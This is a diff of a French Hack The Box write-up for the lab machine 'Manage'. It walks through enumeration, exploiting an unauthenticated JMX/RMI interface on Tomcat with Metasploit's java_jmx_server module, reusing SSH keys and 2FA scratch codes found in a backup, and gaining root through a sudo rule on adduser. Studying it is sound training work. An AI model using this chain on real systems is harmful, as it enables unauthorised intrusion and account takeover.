@@ -13,8 +13,8 @@ draft: false
 
 # --- PaperMod / navigation ---
 type: "writeups"
-summary: "RMI exposé sur Tomcat ouvrant un accès JMX vulnérable exploité via Metasploit."
-description: "Analyse de Manage (HTB Easy) : walkthrough pédagogique avec énumération claire de la surface d’attaque, compréhension des faiblesses de l’application web et méthode structurée pour l’escalade."
+summary: "Service RMI exposé sur Tomcat menant à un accès JMX vulnérable et à une compromission complète de la machine."
+description: "Analyse de Manage (HTB Easy) : walkthrough pas à pas avec énumération claire de la surface d’attaque, compréhension des faiblesses de l’application web et progression guidée jusqu’à l’escalade finale."
 tags: ["Easy","Tomcat","JMX","Metasploit"]
 categories: ["Mes writeups"]
 
@@ -67,19 +67,19 @@ Aucun templating Hugo dans le corps, pour éviter les erreurs d'archetype.
 -->
 ## Introduction
 
-Au départ, les scans Nmap classiques ne donnent rien d'exploitable : juste un Tomcat sur 8080, quelques ports classiques, aucune page intéressante dans les répertoires et aucun vhost valable. 
+Au premier abord, les scans Nmap classiques ne révèlent rien d’exploitable : un Tomcat accessible sur le port 8080, quelques ports standards, aucune page intéressante dans les répertoires et aucun virtual host pertinent.
 
-C'est le scan agressif qui met en lumière quelque chose d'inhabituel : deux ports liés à Java RMI (2222 et 45931). 
+En poursuivant l’énumération avec un scan plus agressif, un élément inhabituel apparaît : deux ports associés à Java RMI (2222 et 45931).
 
-L'association RMI + Tomcat nous offre une piste intéressante : un accès JMX potentiellement mal sécurisé… qui s'avérera être la clé de l'exploitation.
+Cette combinaison **Tomcat + RMI** constitue une piste intéressante. Elle suggère la présence d’un accès **JMX potentiellement mal sécurisé**, qui va rapidement s’avérer être la clé de l’exploitation de la machine.
 
 ---
 
 ## Énumération
 
-Pour démarrer
+Pour démarrer :
 
-- entrons l'adresse IP de la cible `10.129.x.x   cible.htb`  dans /etc/hosts 
+- ajoute l'adresse IP de la cible `10.129.x.x   manage.htb`  dans /etc/hosts 
 
 ```bash
 sudo nano /etc/hosts
@@ -99,21 +99,23 @@ mon-nmap manage.htb
 
 ### Scan initial 
 
-Le scan initial TCP complet (scans_nmap/full_tcp_scan.txt) révèle les ports ouverts suivants :
+Le scan initial TCP complet (`scans_nmap/full_tcp_scan.txt`) révèle les ports ouverts suivants :
 
-```bash
-# Nmap 7.95 scan initiated Mon Nov 17 16:58:19 2025 as: /usr/lib/nmap/nmap --privileged -Pn -p- --min-rate 5000 -T4 --max-retries 3 -oN scans_nmap/full_tcp_scan.txt manage.htb
-Nmap scan report for manage.htb (10.129.234.57)
-Host is up (0.0083s latency).
+> Note : les IP et timestamps peuvent varier selon les resets HTB ; l’important ici est la surface exposée (Tomcat + RMI/JMX).
+
+```txt
+# Nmap 7.98 scan initiated Sun Jan 11 15:26:48 2026 as: /usr/lib/nmap/nmap --privileged -Pn -p- --min-rate 5000 -T4 -oN scans_nmap/full_tcp_scan.txt manage.htb
+Nmap scan report for manage.htb (10.129.37.198)
+Host is up (0.0086s latency).
 Not shown: 65530 closed tcp ports (reset)
 PORT      STATE SERVICE
 22/tcp    open  ssh
 2222/tcp  open  EtherNetIP-1
 8080/tcp  open  http-proxy
-35627/tcp open  unknown
-42277/tcp open  unknown
+37055/tcp open  unknown
+45353/tcp open  unknown
 
-# Nmap done at Mon Nov 17 16:58:27 2025 -- 1 IP address (1 host up) scanned in 7.43 seconds
+# Nmap done at Sun Jan 11 15:26:58 2026 -- 1 IP address (1 host up) scanned in 10.95 seconds
 
 ```
 
@@ -121,38 +123,38 @@ PORT      STATE SERVICE
 
 Le script enchaîne ensuite automatiquement sur un scan agressif orienté vulnérabilités.
 
-Voici le résultat (scans_nmap/aggresive_vuln_scan.txt) :
+Voici le résultat (`scans_nmap/aggresive_vuln_scan.txt`) :
 
-```bash
+```txt
 [+] Scan agressif orienté vulnérabilités (CTF-perfect LEGACY) pour manage.htb
 [+] Commande utilisée :
-    nmap -Pn -A -sV -p"22,2222,8080,35627,42277" --script="http-vuln-*,http-shellshock,http-sql-injection,ssl-cert,ssl-heartbleed,sslv2,ssl-dh-params" --script-timeout=30s -T4 "manage.htb"
+    nmap -Pn -A -sV -p"22,2222,8080,37055,45353" --script="(http-vuln-* or http-shellshock or ssl-heartbleed) and not (http-vuln-cve2017-1001000 or http-sql-injection or ssl-cert or sslv2 or ssl-dh-params)" --script-timeout=30s -T4 "manage.htb"
 
-# Nmap 7.95 scan initiated Mon Nov 17 16:58:27 2025 as: /usr/lib/nmap/nmap --privileged -Pn -A -sV -p22,2222,8080,35627,42277 --script=http-vuln-*,http-shellshock,http-sql-injection,ssl-cert,ssl-heartbleed,sslv2,ssl-dh-params --script-timeout=30s -T4 -oN scans_nmap/aggressive_vuln_scan_raw.txt manage.htb
-Nmap scan report for manage.htb (10.129.234.57)
-Host is up (0.0077s latency).
+# Nmap 7.98 scan initiated Sun Jan 11 15:26:59 2026 as: /usr/lib/nmap/nmap --privileged -Pn -A -sV -p22,2222,8080,37055,45353 "--script=(http-vuln-* or http-shellshock or ssl-heartbleed) and not (http-vuln-cve2017-1001000 or http-sql-injection or ssl-cert or sslv2 or ssl-dh-params)" --script-timeout=30s -T4 -oN scans_nmap/aggressive_vuln_scan.txt manage.htb
+Nmap scan report for manage.htb (10.129.37.198)
+Host is up (0.0089s latency).
 
 PORT      STATE SERVICE    VERSION
 22/tcp    open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
 2222/tcp  open  java-rmi   Java RMI
 8080/tcp  open  http       Apache Tomcat 10.1.19
-35627/tcp open  tcpwrapped
-42277/tcp open  java-rmi   Java RMI
+37055/tcp open  tcpwrapped
+45353/tcp open  java-rmi   Java RMI
 Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
-Device type: general purpose|router
-Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
-OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
-OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14
 Network Distance: 2 hops
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
-TRACEROUTE (using port 8080/tcp)
+TRACEROUTE (using port 22/tcp)
 HOP RTT     ADDRESS
-1   7.57 ms 10.10.14.1
-2   8.06 ms manage.htb (10.129.234.57)
+1   7.82 ms 10.10.14.1
+2   8.33 ms manage.htb (10.129.37.198)
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-# Nmap done at Mon Nov 17 16:58:41 2025 -- 1 IP address (1 host up) scanned in 13.92 seconds
+# Nmap done at Sun Jan 11 15:27:13 2026 -- 1 IP address (1 host up) scanned in 14.58 seconds
 
 ```
 
@@ -160,25 +162,23 @@ OS and Service detection performed. Please report any incorrect results at https
 
 Le scan ciblé CMS (`scans_nmap/cms_vuln_scan.txt`) ne met rien de vraiment exploitable en évidence pour ce CTF.
 
-```bash
-# Nmap 7.95 scan initiated Wed Nov 19 15:55:17 2025 as: /usr/lib/nmap/nmap --privileged -Pn -sV -p22,2222,8080,34827,40961 --script=http-wordpress-enum,http-wordpress-brute,http-wordpress-users,http-drupal-enum,http-drupal-enum-users,http-joomla-brute,http-generator,http-robots.txt,http-title,http-headers,http-methods,http-enum,http-devframework,http-cakephp-version,http-php-version,http-config-backup,http-backup-finder,http-sitemap-generator --script-timeout=30s -T4 -oN scans_nmap/cms_vuln_scan.txt manage.htb
-Nmap scan report for manage.htb (10.129.144.215)
-Host is up (0.012s latency).
+```txt
+# Nmap 7.98 scan initiated Sun Jan 11 15:27:13 2026 as: /usr/lib/nmap/nmap --privileged -Pn -sV -p22,2222,8080,37055,45353 --script=http-wordpress-enum,http-wordpress-brute,http-wordpress-users,http-drupal-enum,http-drupal-enum-users,http-joomla-brute,http-generator,http-robots.txt,http-title,http-headers,http-methods,http-enum,http-devframework,http-cakephp-version,http-php-version,http-config-backup,http-backup-finder,http-sitemap-generator --script-timeout=30s -T4 -oN scans_nmap/cms_vuln_scan.txt manage.htb
+Nmap scan report for manage.htb (10.129.37.198)
+Host is up (0.0081s latency).
 
 PORT      STATE SERVICE    VERSION
 22/tcp    open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
 2222/tcp  open  java-rmi   Java RMI
 8080/tcp  open  http       Apache Tomcat 10.1.19
-| http-methods: 
-|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: Apache Tomcat/10.1.19
 | http-headers: 
 |   Content-Type: text/html;charset=UTF-8
 |   Transfer-Encoding: chunked
-|   Date: Wed, 19 Nov 2025 14:55:12 GMT
+|   Date: Sun, 11 Jan 2026 14:27:23 GMT
 |   Connection: close
 |   
 |_  (Request type: HEAD)
-|_http-title: Apache Tomcat/10.1.19
 | http-sitemap-generator: 
 |   Directory structure:
 |     /
@@ -189,12 +189,14 @@ PORT      STATE SERVICE    VERSION
 |   Total files found (by extension):
 |_    Other: 1; css: 1; ico: 1; svg: 1
 |_http-devframework: Couldn't determine the underlying framework or CMS. Try increasing 'httpspider.maxpagecount' value to spider more pages.
-34827/tcp open  java-rmi   Java RMI
-40961/tcp open  tcpwrapped
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+37055/tcp open  tcpwrapped
+45353/tcp open  java-rmi   Java RMI
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-# Nmap done at Wed Nov 19 15:55:58 2025 -- 1 IP address (1 host up) scanned in 41.24 seconds
+# Nmap done at Sun Jan 11 15:27:48 2026 -- 1 IP address (1 host up) scanned in 34.65 seconds
 
 ```
 
@@ -204,7 +206,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 Le scan UDP rapide (`scans_nmap/udp_vuln_scan.txt`) ne met rien de vraiment exploitable en évidence pour ce CTF.
 
-```bash
+```txt
 # Nmap 7.95 scan initiated Wed Nov 19 15:55:59 2025 as: /usr/lib/nmap/nmap --privileged -n -Pn -sU --top-ports 20 -T4 -oN scans_nmap/udp_vuln_scan.txt manage.htb
 Nmap scan report for manage.htb (10.129.144.215)
 Host is up (0.0086s latency).
@@ -239,132 +241,167 @@ PORT      STATE         SERVICE
 
 ### Scan des répertoires
 
-Pour la partie découverte de chemins web, j'utilise mon script dédié {{< script "mon-recoweb" >}} sur le service Tomcat :
+Pour la partie découverte de chemins web, utilise mon script dédié {{< script "mon-recoweb" >}} sur le service Tomcat  `8080/tcp  open  http       Apache Tomcat 10.1.19 `:
 
 ```bash
-=== mon-recoweb manage.htb START ===
-Script       : mon-recoweb
-Version      : mon-recoweb 2.1.2
-Date         : 2025-11-19 16:09:38
-Domaine      : manage.htb
-IP           : 10.129.144.215
-Mode         : large
-Wordlist eff.: /tmp/mon-recoweb_manage.htb_wl.75meZS
-Master       : /usr/share/wordlists/dirb/common.txt
-Codes        : all  (strict=0)
+mon-recoweb manage.htb:8080
+```
 
-DIR totaux bruts   : 9
-DIR totaux uniques : 7
-  - /docs
-  - /examples
-  - /favicon.ico
-  - /host-manager
-  - /manager
-  - /meta-inf
-  - /web-inf
+```txt
+===== mon-recoweb — RÉSUMÉ DES RÉSULTATS =====
+Commande principale : /home/kali/.local/bin/mes-scripts/mon-recoweb
+Script              : mon-recoweb v2.1.0
 
---- Détails par port ---
-Port 8080 (http)
-  whatweb :
-    http://manage.htb:8080/ [200 OK] Country[RESERVED][ZZ], HTML5, IP[10.129.144.215], Title[Apache Tomcat/10.1.19]
-  Baseline: code=404 size=765 words=68 (/shoisqhc51rnd)
-  DIR (9)
-    - /docs
-    - /examples
-    - /favicon.ico
-    - /host-manager
-    - /manager
-    - /meta-inf
-    - /META-INF
-    - /web-inf
-    - /WEB-INF
+Cible        : manage.htb:8080
+Périmètre    : /
+Date début   : 2026-01-11 15:40:00
 
+Commandes exécutées (exactes) :
 
+[dirb — découverte initiale]
+dirb http://manage.htb:8080/ /usr/share/wordlists/dirb/common.txt -r | tee scans_recoweb/dirb.log
 
-=== mon-recoweb manage.htb END ===
+[ffuf — énumération des répertoires]
+ffuf -u http://manage.htb:8080/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 30 -timeout 10 -fc 404 -of json -o scans_recoweb/ffuf_dirs.json 2>&1 | tee scans_recoweb/ffuf_dirs.log
 
+[ffuf — énumération des fichiers]
+ffuf -u http://manage.htb:8080/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -t 30 -timeout 10 -fc 404 -of json -o scans_recoweb/ffuf_files.json 2>&1 | tee scans_recoweb/ffuf_files.log
 
+Processus de génération des résultats :
+- Les sorties JSON produites par ffuf constituent la source de vérité.
+- Les entrées pertinentes sont extraites via jq (URL, code HTTP, taille de réponse).
+- Les réponses assimilables à des soft-404 sont filtrées par comparaison des tailles et des codes HTTP.
+- Les URLs finales sont reconstruites à partir du périmètre scanné (racine du site ou sous-répertoire ciblé).
+- Les résultats sont normalisés sous la forme :
+    http://cible/chemin (CODE:xxx|SIZE:yyy)
+- Les chemins sont ensuite classés par type :
+    • répertoires (/chemin/)
+    • fichiers (/chemin.ext)
+- Le fichier RESULTS_SUMMARY.txt est généré par agrégation finale, sans retraitement manuel,
+  garantissant la reproductibilité complète du scan.
+
+----------------------------------------------------
+
+=== Résultat global (agrégé) ===
+
+http://manage.htb:8080/. (CODE:200|SIZE:11219)
+http://manage.htb:8080/docs (CODE:302|SIZE:0)
+http://manage.htb:8080/docs/ (CODE:302|SIZE:0)
+http://manage.htb:8080/examples (CODE:302|SIZE:0)
+http://manage.htb:8080/examples/ (CODE:302|SIZE:0)
+http://manage.htb:8080/favicon.ico (CODE:200|SIZE:21630)
+http://manage.htb:8080/host-manager (CODE:302|SIZE:0)
+http://manage.htb:8080/index.jsp (CODE:200|SIZE:11219)
+http://manage.htb:8080/manager (CODE:302|SIZE:0)
+http://manage.htb:8080/manager/ (CODE:302|SIZE:0)
+
+=== Détails par outil ===
+
+[DIRB]
+http://manage.htb:8080/docs (CODE:302|SIZE:0)
+http://manage.htb:8080/examples (CODE:302|SIZE:0)
+http://manage.htb:8080/favicon.ico (CODE:200|SIZE:21630)
+http://manage.htb:8080/host-manager (CODE:302|SIZE:0)
+http://manage.htb:8080/manager (CODE:302|SIZE:0)
+
+[FFUF — DIRECTORIES]
+http://manage.htb:8080/docs/ (CODE:302|SIZE:0)
+http://manage.htb:8080/examples/ (CODE:302|SIZE:0)
+http://manage.htb:8080/manager/ (CODE:302|SIZE:0)
+
+[FFUF — FILES]
+http://manage.htb:8080/. (CODE:200|SIZE:11219)
+http://manage.htb:8080/favicon.ico (CODE:200|SIZE:21630)
+http://manage.htb:8080/index.jsp (CODE:200|SIZE:11219)
 
 ```
 
 ### Scan des vhosts
 
-Enfin, je teste rapidement la présence de vhosts  avec  {{< script "mon-subdomains" >}} :
+Enfin, teste rapidement la présence de vhosts  avec  mon script {{< script "mon-subdomains" >}} :
+
+```bash
+mon-subdomains manage.htb
+```
 
 ```bash
 === mon-subdomains manage.htb START ===
 Script       : mon-subdomains
-Version      : mon-subdomains 2.1.1
-Date         : 2025-11-19 16:18:13
+Version      : mon-subdomains 2.0.0
+Date         : 2026-01-11 15:45:45
 Domaine      : manage.htb
-IP           : 10.129.144.215
-Mode         : fast
+IP           : 10.129.xx.xx
+Mode         : large
 Master       : /usr/share/wordlists/htb-dns-vh-5000.txt
-Codes        : all  (strict=0)
+Codes        : 200,301,302,401,403  (strict=1)
 
 VHOST totaux : 0
   - (aucun)
 
 --- Détails par port ---
 Port 8080 (http)
-  Baseline: code=200 size=11219 words=490 (Host=d88olulhturnd.manage.htb)
+  Baseline#1: code=200 size=11219 words=490 (Host=2w13lzk7kc.manage.htb)
+  Baseline#2: code=200 size=11219 words=490 (Host=nq951g8hlw.manage.htb)
+  Baseline#3: code=200 size=11219 words=490 (Host=sya38wwz8o.manage.htb)
   VHOST (0)
-    - (aucun)
+    - (fuzzing sauté : wildcard probable)
+    - (explication : réponse identique quel que soit Host → vhost-fuzzing non discriminant)
 
 
 
 === mon-subdomains manage.htb END ===
-
 
 ```
 
 
 ---
 
-## Exploitation – Prise pied (Foothold)
 
-### analyse des résultats
+## Exploitation – Prise de pied (Foothold)
 
-- Les résultats du scan des répertoires nous donne :
+  ### Analyse des résultats
 
-  - `http://manage.htb:8080/` : page d'accueil Tomcat par défaut
+  Le scan des répertoires met en évidence un service **Tomcat** accessible sur le port **8080** :
 
-  - Redirections **302** vers quelques applications internes Tomcat :
+  - `http://manage.htb:8080/` : page d’accueil Tomcat par défaut
+  - plusieurs redirections **302** vers des applications internes :
     - `/docs`
     - `/examples`
     - `/manager`
     - `/host-manager`
 
+  En approfondissant l’analyse de `/docs` et `/examples` à l’aide de scans `mon-recoweb` ciblés, aucun contenu applicatif intéressant n’est découvert.  
+  Ces chemins hébergent uniquement la documentation et les exemples standards de Tomcat, sans application spécifique ni interface d’administration personnalisée.
 
-En approfondissant sur `/docs` et `/examples` (nouveaux `mon-recoweb` ciblés), aucun répertoire ou fichier applicatif intéressant n'est découvert : uniquement la documentation Tomcat standard et les exemples, sans appli custom de type “manage” ou panneau d'admin dédié.
+  ---
 
-- Le scan agressif montre :
+  Le scan Nmap agressif apporte en revanche des informations beaucoup plus intéressantes :
 
-  - **Tomcat 10.1.19** sur le port **8080/tcp**
+  - **Tomcat 10.1.19** est confirmé sur **8080/tcp**
+  - deux services **Java RMI** sont exposés sur **2222/tcp** et **45931/tcp**
+  - aucun script `http-vuln-*` ne révèle de vulnérabilité web classique
 
-  - Deux services **Java RMI** sur **2222/tcp** et **45931/tcp** 
+  Point clé : le scan parvient à **interroger le registre RMI**.  
+  Cela signifie que le service ne met en place **ni authentification**, **ni politique de sécurité**, **ni filtrage IP**.
 
-  - Aucun script Nmap “http-vuln-*” ne remonte de vulnérabilité web évidente
+  ---
 
+  Dès l’apparition de `jmxrmi`, plusieurs éléments deviennent clairs :
 
-**Le scan parvient à à interroger le registre RMI**. Si le registre répond, c'est qu'il n'exige **ni authentification**, ni **politique de sécurité**, ni **filtrage IP**.
+  - une interface **JMX Remote** est exposée
+  - elle n’est pas protégée
+  - elle est très probablement exploitable à distance
 
-- Dès que **jmxrmi apparaît**, on sait que :
+  Ce type de configuration ouvre typiquement la voie à une exploitation via le module Metasploit `java_jmx_server`.
 
-  - il existe une interface **JMX Remote**,
+  ---
 
-  - elle n'est pas protégée,
+  À ce stade, il est logique de recentrer l’analyse sur :
 
-  - elle est probablement exploitable via `java_jmx_server` (Metasploit) .
+  - l’interface **Tomcat /manager**
+  - et surtout la **présence des deux services Java RMI**, qui constituent le véritable point d’entrée pour la suite de l’exploitation
 
-- Je recentre donc  l'analyse sur :
-
-  - **Tomcat /manager** 
-
-  - et surtout la **présence des deux services Java RMI**, qui serviront de point d'entrée pour l'exploitation ultérieure.
-
-
-- Un scan complémentaire NMAP NSE orienté **rmi** va nous donner plus d'infos
+  Un scan Nmap complémentaire, orienté spécifiquement **RMI**, va permettre de confirmer ces hypothèses et d’obtenir davantage d’informations exploitables.
 
 ```bash
 nmap --script "rmi*" -sV -p 2222 manage.htb
@@ -388,18 +425,26 @@ Nmap done: 1 IP address (1 host up) scanned in 12.01 seconds
 
 ```
 
-Sur cette machine, le script montre clairement que le serveur RMI accepte des connexions distantes sans authentification. L'entrée `jmxrmi` est accessible, signe d'une configuration Tomcat vulnérable. Une interface JMX ouverte ainsi vers l'extérieur équivaut à une exécution de code à distance. 
+Sur cette machine, le script montre clairement que le serveur **RMI accepte des connexions distantes sans authentification**.  
+L’entrée `jmxrmi` est accessible, ce qui indique une interface **JMX exposée** et **mal sécurisée**.
 
-Une recherche Web sur "Metasploit modules Java RMI JMX" va livrer:
+Dans ce contexte, une interface JMX ouverte vers l’extérieur équivaut pratiquement à une **exécution de code à distance** : JMX permet en effet de charger des classes Java et d’exécuter du code si aucune protection n’est en place.
+
+---
+
+Une recherche ciblée sur *« Metasploit modules Java RMI JMX »* permet rapidement d’identifier un module pertinent :
 
 - **Java JMX Server Insecure Configuration Java Code Execution**
-  - Module : `exploit/multi/misc/java_jmx_server`
-  - Description : Ce module tire parti d'une configuration non sécurisée de l'interface JMX, permettant de charger des classes depuis une URL HTTP distante. Il est efficace contre les interfaces JMX sans authentification ou avec une configuration faible (par exemple, si `com.sun.management.jmxremote.authenticate=false`).
-  - Source : <a href="https://blog.pentesteracademy.com/java-jmx-server-insecure-configuration-java-code-execution-295421a452f7" target="_blank" rel="noopener noreferrer">Pentester Academy</a>
+  - **Module** : `exploit/multi/misc/java_jmx_server`
+  - **Description** : ce module exploite une configuration JMX non sécurisée en chargeant des classes Java depuis une URL HTTP distante.  
+    Il fonctionne lorsque l’interface JMX est exposée **sans authentification**, ou avec une configuration faible (par exemple lorsque `com.sun.management.jmxremote.authenticate=false`).
+  - **Source** :  
+    <a href="https://blog.pentesteracademy.com/java-jmx-server-insecure-configuration-java-code-execution-295421a452f7" target="_blank" rel="noopener noreferrer">Pentester Academy</a>
 
-Cette confirmation va me permettre de tester le module Metasploit `java_jmx_server` qui devrait nous fournir un shell `meterpreter`. 
+---
 
-
+Cette confirmation permet de passer logiquement à l’étape suivante :  
+tester le module Metasploit `java_jmx_server`, qui devrait fournir un premier accès à la machine sous la forme d’un **shell Meterpreter**.
 
 ### Metasploit
 
@@ -525,7 +570,8 @@ msf exploit(multi/misc/java_jmx_server) > exploit
 meterpreter >
 ```
 
-- On explore le shell et on trouve facilement **le flag user.txt**
+- Une fois le shell obtenu, tu peux explorer le système de fichiers.  
+  Le flag **user.txt** est rapidement localisé, confirmant l’accès en tant qu’utilisateur non privilégié.
 
 ```bash
 meterpreter > search -f user.txt
@@ -540,23 +586,8 @@ meterpreter > cat /opt/tomcat/user.txt
 a86dxxxxxxxxxxxxxxxxxxxxxxxxxxxx279
 ```
 
-- on continue l'exploration et on trouve les home directories de deux utilisateurs: karl et useradmin
-- ces deux répertoires sont accessibles par notre utilisateur tomcat
-
-```
-meterpreter > getuid
-Server username: tomcat
-
-meterpreter > ls -la /home
-Listing: /home
-==============
-
-Mode              Size  Type  Last modified              Name
-----              ----  ----  -------------              ----
-040554/r-xr-xr--  4096  dir   2025-04-14 09:26:50 +0200  karl
-040554/r-xr-xr--  4096  dir   2025-06-26 11:58:52 +0200  useradmin
-```
-
+- En poursuivant l’exploration du système, tu identifies les répertoires personnels de deux utilisateurs : **karl** et **useradmin**.  
+- Ces deux *home directories* sont accessibles avec les droits de l’utilisateur **tomcat**, ce qui élargit clairement la surface d’attaque pour la suite de l’escalade.
 - l'exploration de /home/karl ne donne rien d'intéressant
 
 ```bash
@@ -581,7 +612,7 @@ meterpreter >
 
 ```
 
-- on passe à /home/useradmin
+- On poursuit donc l’exploration en se concentrant sur le répertoire **/home/useradmin**, qui est accessible avec les droits actuels.
 
 ```bash
 meterpreter > ls -la /home/useradmin
@@ -604,7 +635,9 @@ meterpreter >
 
 ```
 
-- on trouve un répertoire backups accessible par notre utilisateur tomcat avec un backup.tar.gz qu'on télécharge
+- Dans le répertoire **/home/useradmin**, tu découvres un sous-répertoire **backups** accessible avec les droits de l’utilisateur **tomcat**.  
+
+- Il contient une archive **backup.tar.gz**, que tu peux récupérer localement afin de l’analyser.
 
 ```bash
 meterpreter > ls -la /home/useradmin/backups
@@ -673,7 +706,8 @@ drwxr-xr-x 2 kali kali    0 Jun 21  2024 .ssh
                                                                                        
 ```
 
-- explorons le contenu de  .google_authenticator
+- En explorant le contenu de l’archive, tu remarques la présence d’un fichier **.google_authenticator**.  
+- Ce type de fichier mérite une attention particulière, car il est généralement lié à la configuration d’une authentification à deux facteurs (2FA).
 
 ```bash
 cat .google_authenticator                   
@@ -695,7 +729,8 @@ CLSSSMHYGLENX5HAIFBQ6L35UM
                                                                                        
 ```
 
-- le répertoire .ssh contient **une copie des clés de l'utilisateur useradmin**
+- Le répertoire **.ssh** est également présent dans l’archive et contient **une copie des clés SSH de l’utilisateur _useradmin_**.  
+- Cette exposition de clés privées constitue une faille critique et ouvre directement la voie à une compromission complète du compte.
 
 ```bash
 ls -la .ssh                                    
@@ -717,18 +752,18 @@ drwxr-xr-x 2 kali kali   0 Jun 21  2024 ..
 ### connexion à manage.htb
 
 ```bash
-cp .ssh/id* /home/kali/tmp/ 
+cp ./.ssh/id_ed25519* /home/kali/tmp/
 
 cd /home/kali/tmp/
 chmod 600 id_ed25519
 
 ssh -i id_ed25519 useradmin@manage.htb
 
-cp: cannot stat '.ssh/id*': No such file or directory
 (useradmin@manage.htb) Verification code:
 ```
 
-- pour le `Verification code` j'utilise un des codes de `.google_authenticator` par exemple le premier `99852083`
+- Lors de la connexion, un **Verification code** est demandé.  
+- Tu peux utiliser l’un des codes présents dans le fichier **.google_authenticator**, par exemple le premier code disponible : **99852083**.
 
 ```bash
 Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-142-generic x86_64)
@@ -767,8 +802,8 @@ To check for new updates run: sudo apt update
 useradmin@manage:~$
 ```
 
-- nous voilà connecté à manage.htb
-- commençons par le classique `sudo -l`
+- Te voilà maintenant connecté sur **manage.htb** en tant que `useradmin`.  
+- Comme toujours, tu commences par vérifier les privilèges disponibles avec la commande classique :
 
 ### sudo -l
 
@@ -784,13 +819,31 @@ User useradmin may run the following commands on manage:
     
 ```
 
-### adduser admin
+- ### adduser admin
 
-- La règle sudo **(ALL : ALL) NOPASSWD: /usr/sbin/adduser ^[a-zA-Z0-9]+$** autorise useradmin à lancer `adduser` **sans mot de passe**, mais uniquement avec un argument composé de caractères alphanumériques.
-- Cette restriction empêche d'ajouter directement un utilisateur à un groupe privilégié (ex. `sudo`, `adm`, etc.) puisqu'on ne peut pas passer d'options.
-- Lorsqu'on crée un utilisateur `admin`, Ubuntu crée automatiquement **un groupe du même nom** : `admin`.
-- **Historiquement**, dans Ubuntu, le groupe `admin` appartient aux *sudoers* et possède des droits équivalents à `sudo` (héritage des anciennes versions où `admin` = super-user local).
-- **Résultat : l'utilisateur `admin` nouvellement créé peut exécuter `sudo -i` et obtenir un shell root immédiatement.**
+  La sortie de `sudo -l` révèle une règle intéressante :
+
+  - **(ALL : ALL) NOPASSWD: /usr/sbin/adduser ^[a-zA-Z0-9]+$**
+
+  Cette règle autorise l’utilisateur **useradmin** à exécuter la commande `adduser` **sans mot de passe**, à condition que l’argument fourni soit strictement alphanumérique.
+
+  Cette contrainte empêche toute tentative directe d’ajout à un groupe privilégié (comme `sudo` ou `adm`), puisqu’il est impossible de passer des options supplémentaires à la commande.
+
+  ---
+
+  En revanche, un détail important entre en jeu :  
+  lorsqu’un utilisateur est créé sous Ubuntu, **un groupe du même nom est automatiquement créé**.
+
+  En créant un utilisateur nommé **admin** :
+
+  - le groupe **admin** est créé automatiquement
+  - **historiquement**, sur Ubuntu, le groupe `admin` fait partie des *sudoers*
+  - ce groupe dispose donc de privilèges équivalents à ceux du groupe `sudo`
+
+  ---
+
+  **Résultat :  
+  l’utilisateur admin nouvellement créé peut exécuter `sudo -i` et obtenir un shell root immédiatement, sans aucune autre exploitation.**
 
 
 ```bash
@@ -841,11 +894,11 @@ b364xxxxxxxxxxxxxxxxxxxxxxxxdc34
 
 ## Conclusion
 
-Cette machine illustre une chaîne d'exploitation centrée sur **Tomcat** : un simple port **RMI/JMX exposé** permet d'injecter du code distant et d'obtenir un premier accès via Metasploit.
+Cette machine illustre une chaîne d’exploitation cohérente centrée sur **Tomcat** : un simple service **RMI/JMX exposé** suffit à injecter du code distant et à obtenir un premier accès via Metasploit.
 
-La fouille du système révèle ensuite un **backup mal protégé** contenant une clé SSH valide, ouvrant la voie vers l'utilisateur *useradmin*. 
+En poursuivant l’exploration, tu découvres un **backup mal protégé** contenant une clé SSH valide, ce qui permet de basculer vers l’utilisateur *useradmin*.
 
-À partir de là, l'analyse de `sudo -l` montre une configuration trop permissive du binaire `adduser`, permettant de créer un compte *admin* automatiquement doté de privilèges complets — et donc l'accès root.
+Enfin, l’analyse de `sudo -l` met en évidence une configuration trop permissive du binaire `adduser`.  Elle permet de créer un compte *admin* automatiquement doté de privilèges élevés, conduisant directement à l’obtention d’un accès **root**.
 
 ---
 
